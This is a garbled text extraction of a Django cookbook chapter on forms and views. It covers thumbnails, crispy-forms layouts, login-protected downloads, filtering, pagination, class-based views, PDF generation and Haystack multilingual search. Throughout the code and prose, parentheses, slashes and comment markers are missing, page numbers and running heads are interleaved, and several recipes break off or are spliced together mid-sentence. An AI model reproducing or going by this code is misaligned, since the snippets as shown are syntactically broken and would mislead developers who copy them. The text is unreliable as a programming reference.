THUMBNAIL_SIZE, Image.ANTIALIAS               f_mob = storage.open thumbnail_file_path, "w"              image.save f_mob, "JPEG"              f_mob.close    216  Forms and Views               return "success"         except:             return "error"      def get_thumbnail_picture_url self :         if not self.picture:             return ""         file_path = self.picture.name         filename_base, filename_ext = os.path.splitext file_path          thumbnail_file_path = "%s_thumbnail.jpg" % filename_base         if storage.exists thumbnail_file_path :              if thumbnail version exists, return its URL path             return storage.url thumbnail_file_path           return original as a fallback         return self.picture.url  In the preceding methods, we are using the file storage API instead of directly juggling the  filesystem, as we could then exchange the default storage with Amazon S3 buckets or other  storage services and the methods will still work.  How does the creating the thumbnail work? If we had the original file saved  as quotes 2014 04 20140424140000.png, we are checking whether the  quotes 2014 04 20140424140000_thumbnail.jpg file doesn't exist and, in that case,  we are opening the original image, cropping it from the center, resizing it to 50 x 50 pixels,  and saving it to the storage.  The get_thumbnail_picture_url   method checks whether the thumbnail version  exists in the storage and returns its URL. If the thumbnail version does not exist, the URL of  the original image is returned as a fallback.

The usage of  django-crispy-forms is analogous to fieldsets in the Django contributed administration;  however, it is more advanced and customizable. You define form layout in the Python code  and you don't need to worry about how each field is presented in HTML. However, if you need  to add specific HTML attributes or wrapping, you can easily do that too. Moreover, all the  markup used by django-crispy-forms is located in the templates that can be overwritten  for specific needs.  In this recipe, we will see an example of how to use django-crispy-forms with   Bootstrap 3, which is the most popular frontend framework to develop responsive,   mobile-first web projects.  Getting ready To start with, execute the following tasks one by one:  Download the Bootstrap frontend framework from http:  getbootstrap.com  and  integrate CSS and JavaScript in the templates. Learn more about this in the Arranging the  base.html template recipe in Chapter 4, Templates and JavaScript.  Install django-crispy-forms in your virtual environment using the following command:   myproject_env $ pip install django-crispy-forms  Make sure that crispy_forms is added to INSTALLED_APPS and then set bootstrap3 as  the template pack to be used in this project:   conf base.py or settings.py INSTALLED_APPS =        …     "crispy_forms",    … CRISPY_TEMPLATE_PACK = "bootstrap3"  218  Forms and Views   Let's create a bulletin_board app to illustrate the usage of django-crispy-forms   and put it in INSTALLED_APPS in the settings. We will have a Bulletin model there with  these fields: bulletin_type, title, description, contact_person, phone, email,  and image as follows:   bulletin_board models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django.utils.translation import ugettext_lazy as _ from django.utils.encoding import python_2_unicode_compatible  TYPE_CHOICES =        'searching', _ "Searching"  ,      'offering', _ "Offering"  ,    @python_2_unicode_compatible class Bulletin models.Model :     bulletin_type = models.CharField _ "Type" , max_length=20,           choices=TYPE_CHOICES           title = models.CharField _ "Title" , max_length=255      description = models.TextField _ "Description" ,         max_length=300           contact_person = models.CharField _ "Contact person" ,         max_length=255      phone = models.CharField _ "Phone" , max_length=200,          blank=True      email = models.EmailField _ "Email" , blank=True           image = models.ImageField _ "Image" , max_length=255,         upload_to="bulletin_board ", blank=True       class Meta:         verbose_name = _ "Bulletin"          verbose_name_plural = _ "Bulletins"          ordering =  "title",       def __str__ self :         return self.title  219  Chapter 3   How to do it… Follow these steps:  1.  Let's add a model form for the bulletin in the newly created app. We will attach a form   helper to the form in the initialization method itself. The form helper will have the  layout property that will define the layout for the form, as follows:  bulletin_board forms.py  -*- coding: UTF-8 -*- from django import forms from django.utils.translation import ugettext_lazy as _,\     ugettext from crispy_forms.helper import FormHelper from crispy_forms import layout, bootstrap from .models import Bulletin  class BulletinForm forms.ModelForm :   class Meta:     model = Bulletin     fields = ["bulletin_type", "title", "description",      "contact_person", "phone", "email", "image"]      def __init__ self, *args, **kwargs :       super BulletinForm, self .__init__ *args, **kwargs         self.helper = FormHelper         self.helper.form_action = ""       self.helper.form_method = "POST"        self.fields["bulletin_type"].widget = \         forms.RadioSelect          delete empty choice for the type       del self.fields["bulletin_type"].choices[0]        self.helper.layout = layout.Layout          layout.Fieldset            _ "Main data" ,           layout.Field "bulletin_type" ,           layout.Field "title",              css_class="input-block-level" ,             layout.Field "description",              css_class="input-blocklevel",             rows="3" ,            ,  220  Forms and Views             layout.Fieldset              _ "Image" ,             layout.Field "image",                css_class="input-block-level" ,             layout.HTML u"""{% load i18n %}                {% trans                   "Available formats are JPG, GIF, and PNG.

To render the form in the template, we just need to load the crispy_forms_tags   template tag library and use the {% crispy %} template tag as shown in the  following: { templates bulletin_board change_form.html } {% extends "base.html" %} {% load crispy_forms_tags %}  {% block content %}     {% crispy form %} {% endblock %}  221  Chapter 3   3.  Create the base.html template. You can do this according to the example in the  Arranging the base.html template recipe in Chapter 4, Templates and JavaScript.  How it works… The page with the bulletin form will look similar to the following:  As you can see, the fields are grouped by fieldsets. The first argument of the Fieldset object  defines the legend, the other positional arguments define the fields. You can also pass named  arguments to define the HTML attributes for the fieldset; for example, for the second fieldset,  we are passing title and css_id to set the title and id HTML attributes.  Fields can also have additional attributes passed by named arguments; for example, for   the description field, we are passing css_class and rows to set the class and rows  HTML attributes.  222  Forms and Views   Besides the normal fields, you can pass HTML snippets as this is done with the help block for  the image field. You can also have prepended text fields in the layout. For example, we added a  phone icon to the Phone field and an @ sign for the Email field. As you can see from the example  with the contact fields, we can easily wrap fields in the HTML   elements using the Div  objects. This is useful when specific JavaScript needs to be applied to some form fields.  The action attribute for the HTML form is defined by the form_action property of the  form helper. If you use the empty string as an action, the form will be submitted to the same  view, where the form is included. The method attribute of the HTML form is defined by the  form_method property of the form helper. As you know, the HTML forms allow the GET and  POST methods. Finally, there is a Submit object in order to render the submit button, which  takes the name of the button as the first positional argument and the value of the button as  the second argument.  There's more… For the basic usage, the given example is more than necessary. However, if you need a specific  markup for the forms in your project, you can still overwrite and modify templates of the  django-crispy-forms app as there is no markup hardcoded in the Python files, rather all  the generated markup is rendered through the templates. Just copy the templates from the  django-crispy-forms app to your project's template directory and change them as required.

For example, music, videos, literature, or other artistic works should  be accessible only to the paid members. In this recipe, you will learn how to restrict image  downloads only to the authenticated users using the contributed Django auth app.  Getting ready To start, create the quotes app as in the Uploading images recipe.  223  Chapter 3   How to do it… Execute these steps one by one:  1.  Create the view that will require authentication to download a file, as follows:   quotes views.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals import os from django.shortcuts import get_object_or_404 from django.http import FileResponse from django.utils.text import slugify from django.contrib.auth.decorators import login_required from .models import InspirationalQuote  @login_required login_url="my_login_page"  def download_quote_picture request, quote_id :     quote = get_object_or_404 InspirationalQuote,         pk=quote_id      file_name, file_extension = os.path.splitext          quote.picture.file.name      file_extension = file_extension[1:]   remove the dot     response = FileResponse          quote.picture.file,         content_type="image %s" % file_extension           response["Content-Disposition"] = "attachment;" \         " filename=%s---%s.%s" %           slugify quote.author [:100],         slugify quote.quote [:100],         file_extension           return response  2.  Add the view to the URL configuration:   quotes urls.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.conf.urls import patterns, url  urlpatterns = patterns "",      …     url r'^ ?P \d+  download $',         "quotes.views.download_quote_picture",  224  Forms and Views           name="download_quote_picture"      ,    3.  Then, we need to set the login view in project URL configuration. Note how we are   also adding login_helper for django-crispy-forms:  myproject urls.py  -*- coding: UTF-8 -*- from django.conf.urls import patterns, include, url from django.conf import settings from django.contrib import admin from django.core.urlresolvers import reverse_lazy from django.utils.translation import string_concat from django.utils.translation import ugettext_lazy as _ from django.conf.urls.i18n import i18n_patterns from crispy_forms.helper import FormHelper from crispy_forms import layout, bootstrap  login_helper = FormHelper   login_helper.form_action = reverse_lazy "my_login_page"  login_helper.form_method = "POST" login_helper.form_class = "form-signin" login_helper.html5_required = True login_helper.layout = layout.Layout      layout.HTML string_concat """<h2 class="form-signin- heading">""", _ "Please Sign In" , """ """  ,     layout.Field "username", placeholder=_ "username"  ,     layout.Field "password", placeholder=_ "password"  ,     layout.HTML """<input type="hidden" name="next" value="{{ next  }}"  >""" ,     layout.Submit "submit", _ "Login" , css_class="btn-lg" ,    urlpatterns = i18n_patterns "",      …     url r'login $', "django.contrib.auth.views.login",         {"extra_context": {"login_helper": login_helper}},         name="my_login_page"      ,     url r'^quotes ', include "quotes.urls"  ,    225  Chapter 3   4.  Let's create a template for the login form, as shown in the following:  { templates registration login.html } {% extends "base.html" %} {% load crispy_forms_tags %}  {% block stylesheet %}     {{ block.super }}      <link rel="stylesheet" href="{{ STATIC_URL }}site css login. css"> {% endblock %}  {% block content %}               {% crispy form login_helper %}       {% endblock %}  5.  Create the login.css file to add some style to the login form. Lastly, you should  restrict the users from bypassing Django and downloading restricted files directly.  To do so on an Apache web server, you can put the .htaccess file in the media  quotes directory with the following content if you are using Apache 2.2:  media quotes .htaccess Order deny,allow Deny from all  You can put the following content if you are using Apache 2.4:  media quotes .htaccess Require all denied  How it works… The download_quote_picture   view streams the picture from a specific inspirational  quote. The Content-Disposition header that is set to attachment makes the file  downloadable instead of being immediately shown in the browser. The filename for the file will  be something similar to walt-disney---if-you-can-dream-it-you-can-do-it.png.  The @login_required decorator will redirect the visitor to the login page if he or she tries to  access the downloadable file without being logged in.  As we want to have a nice Bootstrap-style login form, we are using django-crispy- forms again and define a helper for the login_helper form. The helper is passed to the  authorization form as an extra context variable and then used as the second parameter in the  {% crispy %} template tag.  226  Forms and Views   Depending on the CSS applied, the login form might look similar to the following:  See also   f The Uploading images recipe  f The Creating a form layout with django-crispy-forms recipe  Filtering object lists In web development, besides views with forms, it is typical to have object-list views and detail  views. List views can simply list objects that are ordered, for example, alphabetically or by  creation date; however, that is not very user-friendly with huge amounts of data. For the  best accessibility and convenience, you should be able to filter the content by all possible  categories. In this recipe, we will see the pattern that is used to filter list views by any number  of categories.  227  Chapter 3   What we'll be creating is a list view of movies that can be filtered by genre, director, actor, or  rating. It will look similar to the following with Bootstrap 3 applied to it:  Getting ready For the filtering example, we will use the Movie model with relations to genres, directors, and  actors to filter by. It will also be possible to filter by ratings, which is PositiveIntegerField  with choices. Let's create the movies app, put it in INSTALLED_APPS in the settings, and  define the mentioned models in the new app, as follows:   movies models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django.utils.translation import ugettext_lazy as _ from django.utils.encoding import python_2_unicode_compatible  RATING_CHOICES =        1, "" ,      2, "" ,      3, "" ,  228  Forms and Views        4, "" ,      5, "" ,    @python_2_unicode_compatible class Genre models.Model :     title = models.CharField _ "Title" , max_length=100       def __str__ self :         return self.title  @python_2_unicode_compatible class Director models.Model :     first_name = models.CharField _ "First name" , max_length=40      last_name = models.CharField _ "Last name" , max_length=40       def __str__ self :         return self.first_name + " " + self.last_name  @python_2_unicode_compatible class Actor models.Model :     first_name = models.CharField _ "First name" , max_length=40      last_name = models.CharField _ "Last name" , max_length=40       def __str__ self :         return self.first_name + " " + self.last_name  @python_2_unicode_compatible class Movie models.Model :     title = models.CharField _ "Title" , max_length=255      genres = models.ManyToManyField Genre, blank=True      directors = models.ManyToManyField Director, blank=True      actors = models.ManyToManyField Actor, blank=True      rating = models.PositiveIntegerField choices=RATING_CHOICES           def __str__ self :         return self.title  229  Chapter 3   How to do it… To complete the recipe, follow these steps:  1.  First of all, we create MovieFilterForm with all the possible categories to filter by:   movies forms.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django import forms from django.utils.translation import ugettext_lazy as _  from .models import Genre, Director, Actor, RATING_CHOICES  class MovieFilterForm forms.Form :     genre = forms.ModelChoiceField          label=_ "Genre" ,         required=False,         queryset=Genre.objects.all  ,           director = forms.ModelChoiceField          label=_ "Director" ,         required=False,         queryset=Director.objects.all  ,           actor = forms.ModelChoiceField          label=_ "Actor" ,         required=False,         queryset=Actor.objects.all  ,           rating = forms.ChoiceField          label=_ "Rating" ,         required=False,         choices=RATING_CHOICES,        2.  Then, we create a movie_list view that will use MovieFilterForm to validate  the request query parameters and perform the filtering for chosen categories. Note  the facets dictionary that is used here to list the categories and also the currently  selected choices:  movies views.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals  230  Forms and Views   from django.shortcuts import render from .models import Genre, Director, Actor from .models import Movie, RATING_CHOICES from .forms import MovieFilterForm  def movie_list request :     qs = Movie.objects.order_by "title"           form = MovieFilterForm data=request.GET       facets = {         "selected": {},         "categories": {             "genres": Genre.objects.all  ,             "directors": Director.objects.all  ,             "actors": Actor.objects.all  ,             "ratings": RATING_CHOICES,         },     }      if form.is_valid  :         genre = form.cleaned_data["genre"]         if genre:             facets["selected"]["genre"] = genre             qs = qs.filter genres=genre .distinct            director = form.cleaned_data["director"]         if director:             facets["selected"]["director"] = director             qs = qs.filter directors=director .distinct            actor = form.cleaned_data["actor"]         if actor:             facets["selected"]["actor"] = actor             qs = qs.filter actors=actor .distinct            rating = form.cleaned_data["rating"]         if rating:             rating = int rating              facets["selected"]["rating"] =  rating, dict RATING_ CHOICES [rating]              qs = qs.filter rating=rating .distinct         Let's inspect the facets in the console  231  Chapter 3       if settings.DEBUG:         from pprint import pprint         pprint facets       context = {         "form": form,         "facets": facets,         "object_list": qs,     }     return render request, "movies movie_list.html",         context   3.  Lastly, we create the template for the list view. We will use the facets dictionary   here to list the categories and know which category is currently selected. To generate  URLs for the filters, we will use the {% modify_query %} template tag, which will  be described later in the Creating a template tag to modify request query parameters  recipe in Chapter 5, Custom Template Filters and Tags.

Add a simple base template with two-column layout, as follows:  { base_two_columns.html } {% extends "base.html" %}  {% block container %}                                               {% block sidebar %}                 {% endblock %}                                             {% block content %}                 {% endblock %}                               {% endblock %}  234  Forms and Views   5.  Create the base.html template. You can do that according to the example provided in   the Arranging the base.html template recipe in Chapter 4, Templates and JavaScript.  How it works… We are using the facets dictionary that is passed to the template context to know which filters  we have and which filters are selected. To look deeper, the facets dictionary consists of  two sections: the categories dictionary and the selected dictionary. The categories  dictionary contains QuerySets or choices of all filterable categories. The selected  dictionary contains the currently selected values for each category.  In the view, we check whether the query parameters are valid in the form and then drill down  QuerySet of objects from the selected categories. Additionally, we set the selected values to  the facets dictionary, which will be passed to the template.  In the template, for each categorization from the facets dictionary, we list all the categories  and mark the currently selected category as active.  It is as simple as that.  See also   f The Managing paginated lists recipe  f The Composing class-based views recipe  f The Creating a template tag to modify request query parameters recipe in Chapter 5,   Custom Template Filters and Tags  Managing paginated lists If you have dynamically changing lists of objects or the amount of them is greater than 30,  you will surely need pagination for the list. With pagination, instead of the full QuerySet,  you provide a fraction of the dataset that is limited to a specific amount per page and you will  also show the links to get to the other pages of the list. Django has classes to manage the  paginated data, and we will see how to do that in this recipe for the example provided in the  previous recipe.  Getting ready Let's start with the forms and views of the movies app from the Filtering object lists recipe.  235  Chapter 3   How to do it… To add pagination to the list view of the movies, follow these steps:  1.  First, import the necessary pagination classes from Django. We will add pagination   management to the movie_list view just after filtering. Also, we will slightly modify  the context dictionary by assigning page instead of the movie QuerySet to the   object_list key:  movies views.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.shortcuts import render from django.core.paginator import Paginator, EmptyPage,\     PageNotAnInteger  from .models import Movie from .forms import MovieFilterForm  def movie_list request :     paginate_by = 15     qs = Movie.objects.order_by "title"       … filtering goes here…      paginator = Paginator qs, paginate_by       page_number = request.GET.get "page"      try:         page = paginator.page page_number      except PageNotAnInteger:          If page is not an integer, show first page.         page = paginator.page 1      except EmptyPage:          If page is out of range, show last existing page.         page = paginator.page paginator.num_pages       context = {          …         "object_list": page,     }     return render request, "movies movie_list.html", context   2.   In the template, we will add pagination controls after the list of movies, as follows: { templates movies movie_list.html } {% extends "base.html" %}  236  Forms and Views   {% load i18n utility_tags %}  {% block sidebar %}     { … filters go here… } {% endblock %}  {% block content %}       {% for movie in object_list %}                        {{ movie.title }}                {% endfor %}    {% if object_list.has_other_pages %}               {% if object_list.has_previous %}              <a href="{% modify_query page=object_list. previous_page_number %}">&laquo;           {% else %}               &laquo;           {% endif %}         {% for page_number in object_list.paginator.page_range %}             {% if page_number == object_list.number %}                                        {{ page_number }} <span class="sr- only"> current                                  {% else %}                                       <a href="{% modify_query page=page_number  %}">{{ page_number }}                                {% endif %}         {% endfor %}         {% if object_list.has_next %}              <a href="{% modify_query page=object_list.next_ page_number %}">&raquo;           {% else %}               &raquo;           {% endif %}       {% endif %} {% endblock %}  237  Chapter 3   How it works… When you look at the results in the browser, you will see the pagination controls similar to the  following, added after the list of movies:  How do we achieve this? When the QuerySet is filtered out, we will create a paginator  object passing QuerySet and the maximal amount of items that we want to show per page,  which is 15 here. Then, we will read the current page number from the query parameter,  page. The next step is to retrieve the current page object from paginator. If the page  number is not an integer, we get the first page. If the number exceeds the amount of possible  pages, the last page is retrieved. The page object has methods and attributes necessary  for the pagination widget shown in the preceding screenshot. Also, the page object acts like  QuerySet so that we can iterate through it and get the items from the fraction of the page.  The snippet marked in the template creates a pagination widget with the markup for the  Bootstrap 3 frontend framework. We show the pagination controls only if there are more  pages than the current one. We have the links to the previous and next pages, and the list of  all page numbers in the widget. The current page number is marked as active. To generate  URLs for the links, we use the {% modify_query %} template tag, which will be described  later in the Creating a template tag to modify request query parameters recipe in Chapter 5,  Custom Template Filters and Tags.  See also   f The Filtering object lists recipe  f The Composing class-based views recipe  f The Creating a template tag to modify request query parameters recipe in Chapter 5,   Custom Template Filters and Tags  238  Forms and Views   Composing class-based views Django views are callables that take requests and return responses. In addition to the  function-based views, Django provides an alternative way to define views as classes. This  approach is useful when you want to create reusable modular views or combine views of the  generic mixins. In this recipe, we will convert the previously shown function-based movie_ list view to a class-based MovieListView view.  Getting ready Create the models, form, and template similar to the previous recipes, Filtering object lists  and Managing paginated lists.  How to do it…  1.  We will need to create a URL rule in the URL configuration and add a class-based   view. To include a class-based view in the URL rules, the as_view   method is used,  as follows:  movies urls.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.conf.urls import patterns, url from .views import MovieListView urlpatterns = patterns "",     url r'^$', MovieListView.as_view  , name="movie_list" ,    2.  Our class-based view, MovieListView, will inherit the Django View class and   override the get   and post   methods, which are used to distinguish between the  requests by GET and POST. We will also add the get_queryset_and_facets    and get_page   methods to make the class more modular:  movies views.py  -*- coding: UTF-8 -*- from django.shortcuts import render from django.core.paginator import Paginator, EmptyPage,\     PageNotAnInteger from django.views.generic import View  from .models import Genre from .models import Director from .models import Actor from .models import Movie, RATING_CHOICES  239  Chapter 3   from .forms import MovieFilterForm  class MovieListView View :     form_class = MovieFilterForm     template_name = "movies movie_list.html"     paginate_by = 15      def get self, request, *args, **kwargs :         form = self.form_class data=request.GET          qs, facets = self.get_queryset_and_facets form          page = self.get_page request, qs          context = {             "form": form,             "facets": facets,             "object_list": page,         }         return render request, self.template_name, context       def post self, request, *args, **kwargs :         return self.get request, *args, **kwargs       def get_queryset_and_facets self, form :         qs = Movie.objects.order_by "title"           facets = {             "selected": {},             "categories": {                 "genres": Genre.objects.all  ,                 "directors": Director.objects.all  ,                 "actors": Actor.objects.all  ,                 "ratings": RATING_CHOICES,             },         }         if form.is_valid  :             genre = form.cleaned_data["genre"]             if genre:                 facets["selected"]["genre"] = genre                 qs = qs.filter genres=genre .distinct                director = form.cleaned_data["director"]             if director:                 facets["selected"]["director"] = director                 qs = qs.filter                      directors=director,  240  Forms and Views                    .distinct                actor = form.cleaned_data["actor"]             if actor:                 facets["selected"]["actor"] = actor                 qs = qs.filter actors=actor .distinct                rating = form.cleaned_data["rating"]             if rating:                 facets["selected"]["rating"] =                       int rating ,                     dict RATING_CHOICES [int rating ]                                   qs = qs.filter rating=rating .distinct           return qs, facets      def get_page self, request, qs :         paginator = Paginator qs, self.paginate_by           page_number = request.GET.get "page"          try:             page = paginator.page page_number          except PageNotAnInteger:              If page is not an integer, show first page.             page = paginator.page 1          except EmptyPage:              If page is out of range,              show last existing page.             page = paginator.page paginator.num_pages          return page  How it works… The following are the things happening in the get   method:  First, we create the form object passing the GET dictionary-like object to it. The GET object  contains all the query variables that are passed using the GET method.  Then, the form is passed to the get_queryset_and_facets   method, which returns a  tuple of the following two elements: the QuerySet and the facets dictionary respectively.  Then, the current request object and QuerySet is passed to the get_page   method,  which returns the current page object.  Lastly, we create a context dictionary and render the response.  241  Chapter 3   There's more… As you see, the get  , post  , and get_page   methods are generic so that we could  create a generic FilterableListView class with these methods in the utils app. Then,  in any app that requires a filterable list, we could create a class-based view that extends  FilterableListView and defines only the form_class and template_name attributes  and the get_queryset_and_facets   method. This is how class-based views work.

We will be using the Pisa xhtml2pdf  library, which is very practical as it allows you to use HTML templates to make PDF documents.  Getting ready First of all, we need to install the xhtml2pdf Python library in your virtual environment:   myproject_env $ pip install xhtml2pdf  Then, let's create a cv app containing a simple CV model with the Experience model that is  attached to it through a foreign key. The CV model will have these fields: first name, last name,  and e-mail. The Experience model will have these fields: the start date of a job, the end  date of a job, company, position at that company, and the skills gained:   cv models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django.utils.translation import ugettext_lazy as _ from django.utils.encoding import python_2_unicode_compatible  @python_2_unicode_compatible class CV models.Model :     first_name = models.CharField _ "First name" , max_length=40      last_name = models.CharField _ "Last name" , max_length=40   242  Forms and Views       email = models.EmailField _ "Email"        def __str__ self :         return self.first_name + " " + self.last_name  @python_2_unicode_compatible class Experience models.Model :     cv = models.ForeignKey CV      from_date = models.DateField _ "From"       till_date = models.DateField _ "Till" , null=True, blank=True      company = models.CharField _ "Company" , max_length=100      position = models.CharField _ "Position" , max_length=100      skills = models.TextField _ "Skills gained" , blank=True       def __str__ self :         till = _ "present"          if self.till_date:             till = self.till_date.strftime "%m %Y"          return _ "% from s-% till s % pos s at % company s"  % {             "from": self.from_date.strftime "%m %Y" ,             "till": till,             "pos": self.position,             "company": self.company,         }     class Meta:         ordering =  "-from_date",   How to do it… Execute the following steps to complete the recipe:  1.

Document generated at {% now "Y-m-d" %}          Page   of                  246  Forms and Views   How it works… Go to model administration and enter a CV document. Then, if you access the document's  URL at http:  127.0.0.1:8000 en cv 1 pdf , you will be asked to download a PDF  document that looks something similar to the following:  247  Chapter 3   How does the view work? First, we load a curriculum vitae by its ID, if it exists, or raise the  page not found error, if it doesn't. Then, we create the response object with the content type  of the PDF document. We set the Content-Disposition header to attachment with the  specified filename. This will force the browsers to open a dialog box prompting us to save   the PDF document and suggesting the specified name for the file. Then, we render the   HTML template as a string passing curriculum vitae object and the MEDIA_ROOT and  STATIC_ROOT paths.  Note that the src attribute of the   tag that is used for the  PDF creation needs to point to the file in the filesystem or the full  URL of the online image. Pisa xhtml2pdf will download the image  and include it in the PDF document.  Then, we create a pisaDocument file with the UTF-8-encoded HTML as source and response  object as the destination. The response object is a file-like object and pisaDocument writes  the content of the document to it. The response object is returned by the view as expected.  Let's take a look at the HTML template that is used to create this document. The template has  some unusual markup tags and CSS rules. If we want to have some elements on each page of  the document, we can create CSS frames for that. In the preceding example, the   tag  with the footerContent ID is marked as a frame, which will be repeated at the bottom of  each page. In a similar way, we can have a header or background image for each page.  The following are the specific markup tags used in this document:   f The   tag sets a manual page break  f The   tag returns the number of the current page  f The   tag returns the total number of pages  The current version 0.0.6 of the Pisa xhtml2pdf library doesn't fully support all HTML tags and  CSS rules. There are no publicly-accessible benchmarks to see what exactly is supported and  at what level. Therefore, you would need to experiment in order to make a PDF document look  like in the design requirements. However, this library is still mighty enough for customized  layouts, which can be basically created just with the knowledge of HTML and CSS.

Haystack  is a modular search API that supports the Solr, Elasticsearch, Whoosh, and Xapian search  engines. For each model in your project that has to be findable in the search, you need to  define an index that will read out the textual information from the models and place it into   the backend. In this recipe, you will learn how to set up a search with Haystack and the  Python-based Whoosh search engine for a multilingual website.  Getting ready In the beginning, let's create a couple of apps with models that will be indexed in the search.  Let's create an ideas app containing the Category and Idea models, as follows:   ideas models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.db import models from django.utils.translation import ugettext_lazy as _ from django.core.urlresolvers import reverse from django.core.urlresolvers import NoReverseMatch from django.utils.encoding import python_2_unicode_compatible from utils.models import UrlMixin from utils.fields import MultilingualCharField, MultilingualTextField  @python_2_unicode_compatible class Category models.Model :     title = MultilingualCharField _ "Title" , max_length=200       class Meta:         verbose_name = _ "Idea Category"          verbose_name_plural = _ "Idea Categories"       def __str__ self :         return self.title  @python_2_unicode_compatible class Idea UrlMixin :     title = MultilingualCharField _ "Title" , max_length=200      subtitle = MultilingualCharField _ "Subtitle" , max_length=200,  blank=True   249  Chapter 3       description = MultilingualTextField _ "Description" ,         blank=True      is_original = models.BooleanField _ "Original"       categories = models.ManyToManyField Category,         verbose_name=_ "Categories" , blank=True,         related_name="ideas"       class Meta:         verbose_name = _ "Idea"          verbose_name_plural = _ "Ideas"       def __str__ self :         return self.title      def get_url_path self :         try:             return reverse "idea_detail", kwargs={"id": self.pk}          except NoReverseMatch:             return ""  The Idea model has multilingual fields, which means that there is supposed to be a  translation of the content for each language.  Another app will be quotes from the Uploading images recipe with the InspirationalQuote  model, where each quote can just be in any one language from the languages defined in  settings.LANGUAGES and each quote doesn't necessarily have a translation:   quotes models.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals import os from django.db import models from django.utils.timezone import now as timezone_now from django.utils.translation import ugettext_lazy as _ from django.utils.encoding import python_2_unicode_compatible from django.conf import settings from django.core.urlresolvers import reverse from django.core.urlresolvers import NoReverseMatch  from utils.models import UrlMixin  def upload_to instance, filename :     now = timezone_now       filename_base, filename_ext = os.path.splitext filename      return 'quotes %s%s' %    250  Forms and Views           now.strftime "%Y %m %Y%m%d%H%M%S" ,         filename_ext.lower  ,            @python_2_unicode_compatible class InspirationalQuote UrlMixin :     author = models.CharField _ "Author" , max_length=200      quote = models.TextField _ "Quote"       picture = models.ImageField _ "Picture" , upload_to=upload_to,         blank=True, null=True      language = models.CharField _ "Language" , max_length=2,         blank=True, choices=settings.LANGUAGES           class Meta:         verbose_name = _ "Inspirational Quote"          verbose_name_plural = _ "Inspirational Quotes"               def __str__ self :         return self.quote      def get_url_path self :         try:             return reverse "quote_detail", kwargs={"id": self.pk}          except NoReverseMatch:             return ""      …     def title self :         return self.quote  Put these two apps in INSTALLED_APPS in the settings, create and apply database  migrations, and create the model administration for these models to add some data. Also,  create list and detail views for these models and plug them in the URL rules. If you are having  any difficulty with any of these tasks, familiarize yourself with the concepts in the official  Django tutorial once again: https:  docs.djangoproject.com en 1.8 intro  tutorial01 .  Make sure you installed django-haystack, whoosh, and django-crispy-forms in your virtual  environment:   myproject_env $ pip install django-crispy-forms   myproject_env $ pip install django-haystack   myproject_env $ pip install whoosh  251  Chapter 3   How to do it… Let's set up the multilingual search with Haystack and Whoosh by executing the following steps:  1.  Create a search app that will contain the MultilingualWhooshEngine   and search indexes for our ideas and quotes. The search engine will live in the  multilingual_whoosh_backend.py file:  search multilingual_whoosh_backend.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.conf import settings from django.utils import translation from haystack.backends.whoosh_backend import \     WhooshSearchBackend, WhooshSearchQuery, WhooshEngine from haystack import connections from haystack.constants import DEFAULT_ALIAS  class MultilingualWhooshSearchBackend WhooshSearchBackend :     def update self, index, iterable, commit=True,         language_specific=False :         if not language_specific and \         self.connection_alias == "default":             current_language =  translation.get_language                   or settings.LANGUAGE_CODE [:2]             for lang_code, lang_name in settings.LANGUAGES:                 using = "default_%s" % lang_code                 translation.activate lang_code                  backend = connections[using].get_backend                   backend.update index, iterable, commit,                     language_specific=True              translation.activate current_language          elif language_specific:             super MultilingualWhooshSearchBackend, self .\                 update index, iterable, commit   class MultilingualWhooshSearchQuery WhooshSearchQuery :     def __init__ self, using=DEFAULT_ALIAS :         lang_code = translation.get_language  [:2]         using = "default_%s" % lang_code         super MultilingualWhooshSearchQuery, self .\             __init__ using   class MultilingualWhooshEngine WhooshEngine :     backend = MultilingualWhooshSearchBackend     query = MultilingualWhooshSearchQuery  252  Forms and Views   2.  Then, let's create the search indexes, as follows:   search search_indexes.py  -*- coding: UTF-8 -*- from __future__ import unicode_literals from django.conf import settings from django.utils.translation import get_language from haystack import indexes from ideas.models import Idea from quotes.models import InspirationalQuote  class IdeaIndex indexes.SearchIndex, indexes.Indexable :     text = indexes.CharField document=True       def get_model self :         return Idea      def index_queryset self, using=None :         """Used when the entire index for model             is updated."""         return self.get_model  .objects.all        def prepare_text self, obj :          this will be called for each language   backend         return "\n".join               obj.title,             obj.subtitle,             obj.description,             "\n".join [cat.title                 for cat in obj.categories.all               ] ,             class InspirationalQuoteIndex indexes.SearchIndex,     indexes.Indexable :     text = indexes.CharField document=True       def get_model self :         return InspirationalQuote      def index_queryset self, using=None :         """Used when the entire index for model             is updated."""         if using and using != "default":  253  Chapter 3               lang_code = using.replace "default_", ""          else:             lang_code = settings.LANGUAGE_CODE[:2]         return self.get_model  .objects.filter language=lang_code       def prepare_text self, obj :          this will be called for each language   backend         return "\n".join               obj.author,             obj.quote,             3.  Later, configure the settings to use our MultilingualWhooshEngine:  INSTALLED_APPS =        …      third party     "crispy_forms",     "haystack",      project-specific     "quotes",     "utils",     "ideas",     "search",   LANGUAGE_CODE = "en" LANGUAGES =        "en", "English" ,      "de", "Deutsch" ,      "fr", "Français" ,      "lt", "Lietuvių kalba" ,   CRISPY_TEMPLATE_PACK = "bootstrap3" HAYSTACK_CONNECTIONS = {     "default": {         "ENGINE": "search.multilingual_whoosh_backend."\             "MultilingualWhooshEngine",         "PATH": os.path.join PROJECT_PATH, "myproject",             "tmp", "whoosh_index_en" ,     },     "default_en": {         "ENGINE": "search.multilingual_whoosh_backend."\             "MultilingualWhooshEngine",         "PATH": os.path.join PROJECT_PATH, "myproject",             "tmp", "whoosh_index_en" ,  254  Forms and Views       },     "default_de": {         "ENGINE": "search.multilingual_whoosh_backend."\             "MultilingualWhooshEngine",         "PATH": os.path.join PROJECT_PATH, "myproject",             "tmp", "whoosh_index_de" ,     },     "default_fr": {         "ENGINE": "search.multilingual_whoosh_backend."\             "MultilingualWhooshEngine",         "PATH": os.path.join PROJECT_PATH, "myproject",             "tmp", "whoosh_index_fr" ,     },     